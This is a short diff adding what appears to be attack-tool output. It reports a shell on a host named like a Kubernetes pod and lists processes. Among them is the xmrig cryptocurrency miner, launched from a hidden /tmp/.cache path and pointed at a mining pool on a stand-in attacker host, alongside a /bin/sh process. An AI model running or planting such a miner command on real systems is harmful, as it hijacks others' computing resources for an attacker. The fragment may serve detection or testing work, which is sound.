@@ -1,0 +1,4 @@
+
+[+] shell on blog-84c9b5fdc8-qg2sz at 13:36:45
+   42 /tmp/.cache/xmrig -o stratum+tcp://attacker.example.local:3333 --donate-level 0
+   58 /bin/sh
